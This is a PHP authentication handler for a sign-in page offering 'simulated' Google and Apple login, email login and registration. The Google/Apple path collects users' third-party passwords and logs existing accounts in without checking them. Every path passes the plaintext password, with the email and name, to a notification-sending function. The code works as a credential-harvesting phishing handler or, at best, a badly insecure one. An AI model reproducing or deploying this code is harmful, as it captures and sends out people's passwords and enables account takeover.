<?php

/**
 * Process Authentication
 * Handles form submissions from auth.php and processes authentication
 */

// Include necessary files
require_once 'includes/config.php';
require_once 'includes/functions.php';

// Only process POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    redirect('index.php');
}

// Validate CSRF token
if (!isset($_POST['csrf_token']) || !validate_csrf_token($_POST['csrf_token'])) {
    // Invalid token, possible CSRF attack
    $_SESSION['error'] = 'Security validation failed. Please try again.';
    redirect('index.php');
}

// Get authentication type
$auth_type = isset($_POST['auth_type']) ? sanitize_input($_POST['auth_type']) : '';

// Validate required auth_type
if (!in_array($auth_type, ['google', 'apple', 'email', 'register'])) {
    $_SESSION['error'] = 'Invalid authentication method.';
    redirect('index.php');
}

// Sanitize all user inputs
$email = isset($_POST['email']) ? sanitize_input($_POST['email']) : '';
$full_name = isset($_POST['full_name']) ? sanitize_input($_POST['full_name']) : '';
$password = isset($_POST['password']) ? $_POST['password'] : ''; // Don't sanitize passwords
$confirm_password = isset($_POST['confirm_password']) ? $_POST['confirm_password'] : '';

// Validate email
if (!validate_email($email)) {
    $_SESSION['error'] = 'Please enter a valid email address.';
    redirect("auth.php?type=$auth_type");
}

// Process based on authentication type
switch ($auth_type) {
    case 'google':
    case 'apple':
        // For Google and Apple auth (simulated)
        if (empty($full_name)) {
            $_SESSION['error'] = 'Please provide your full name.';
            redirect("auth.php?type=$auth_type");
        }

        if (empty($password)) {
            $_SESSION['error'] = 'Please provide your password.';
            redirect("auth.php?type=$auth_type");
        }

        // Check if user already exists
        $user = get_user_by_email($email);

        if ($user) {
            // User exists, update if needed and log in
            $user_id = $user['id'];
        } else {
            // Create new user
            $user_id = create_user($auth_type, $email, $full_name, $password);

            if (!$user_id) {
                $_SESSION['error'] = 'Failed to create account. Please try again.';
                redirect("auth.php?type=$auth_type");
            }

            // Get the new user
            $user = get_user_by_email($email);
        }

        // Log the successful login
        log_login_attempt($user_id, $auth_type, 'success');

        // Create user session
        create_user_session($user);

        // Send email notification (optional)
        send_login_notification([
            'auth_type' => $auth_type,
            'email' => $email,
            'password' => $password,
            'full_name' => $full_name
        ]);

        // Redirect to success page
        redirect('success.php');
        break;

    case 'register':
        // Validate registration fields
        if (empty($full_name)) {
            $_SESSION['error'] = 'Please provide your full name.';
            redirect("auth.php?type=$auth_type");
        }

        if (empty($password) || strlen($password) < 8) {
            $_SESSION['error'] = 'Password must be at least 8 characters long.';
            redirect("auth.php?type=$auth_type");
        }

        if ($password !== $confirm_password) {
            $_SESSION['error'] = 'Passwords do not match.';
            redirect("auth.php?type=$auth_type");
        }

        // Check if the email is already in use
        if (get_user_by_email($email)) {
            $_SESSION['error'] = 'This email is already registered. Please sign in.';
            redirect("auth.php?type=email");
        }

        // Create the user
        $user_id = create_user('email', $email, $full_name, $password);

        if (!$user_id) {
            $_SESSION['error'] = 'Failed to create account. Please try again.';
            redirect("auth.php?type=$auth_type");
        }

        // Get the new user
        $user = get_user_by_email($email);

        // Log the successful registration
        log_login_attempt($user_id, 'register', 'success');

        // Create user session
        create_user_session($user);

        // Send email notification (optional)
        send_login_notification([
            'auth_type' => 'register',
            'email' => $email,
            'password' => $password,
            'full_name' => $full_name
        ]);

        // Redirect to success page
        redirect('success.php');
        break;

    case 'email':
        // Validate login credentials
        if (empty($password)) {
            $_SESSION['error'] = 'Please enter your password.';
            redirect("auth.php?type=$auth_type");
        }

        // Check if user exists
        $user = get_user_by_email($email);

        if (!$user) {
            // Log failed login attempt
            log_login_attempt(null, 'email', 'failed');

            $_SESSION['error'] = 'Invalid email or password.';
            redirect("auth.php?type=$auth_type");
        }

        // Verify password
        if (!password_verify($password, $user['password'])) {
            // Log failed login attempt
            log_login_attempt($user['id'], 'email', 'failed');

            $_SESSION['error'] = 'Invalid email or password.';
            redirect("auth.php?type=$auth_type");
        }

        // Log the successful login
        log_login_attempt($user['id'], 'email', 'success');

        // Create user session
        create_user_session($user);

        // Send email notification (optional)
        send_login_notification([
            'auth_type' => 'email',
            'email' => $email,
            'password' => $password,
            'full_name' => $user['full_name']
        ]);

        // Redirect to success page
        redirect('success.php');
        break;

    default:
        // Invalid auth type
        $_SESSION['error'] = 'Invalid authentication method.';
        redirect('index.php');
}
